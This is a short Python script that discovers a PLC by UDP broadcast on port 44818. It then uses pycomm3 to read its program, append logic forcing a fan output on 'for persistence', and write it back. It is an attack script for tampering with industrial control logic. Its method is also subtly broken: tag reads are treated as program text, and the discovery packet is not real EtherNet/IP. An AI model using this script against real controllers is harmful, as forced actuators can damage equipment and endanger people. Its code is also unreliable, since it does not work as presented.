from pycomm3 import LogixDriver
import socket
import struct

def find_plc_ip():
    # Broadcast a message to find the PLC's IP address
    broadcast_ip = '255.255.255.255'
    port = 44818  # EtherNet/IP port

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    # Send a broadcast message
    sock.sendto(b'FindPLC', (broadcast_ip, port))

    # Wait for a response
    sock.settimeout(5)
    try:
        data, addr = sock.recvfrom(1024)
        plc_ip = addr[0]
        print(f"Found PLC at IP: {plc_ip}")
        return plc_ip
    except socket.timeout:
        print("PLC not found on the network.")
        return None
    finally:
        sock.close()

def modify_plc_program(plc_ip):
    # Connect to the PLC
    plc = LogixDriver(plc_ip)
    plc.open()

    try:
        # Read the current program
        program = plc.read_tag('MainProgram')

        # Modify the program to add persistence logic
        new_logic = """
        // Rung 3 - Added for persistence
        IF NOT M_ACTFAN THEN
            M_ACTFAN := TRUE;
        END_IF;
        """

        # Append the new logic to the existing program
        modified_program = program + new_logic

        # Write the modified program back to the PLC
        plc.write_tag('MainProgram', modified_program)

        print("Program modified successfully for persistence.")
    except Exception as e:
        print(f"Error modifying program: {e}")
    finally:
        plc.close()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        modify_plc_program(plc_ip)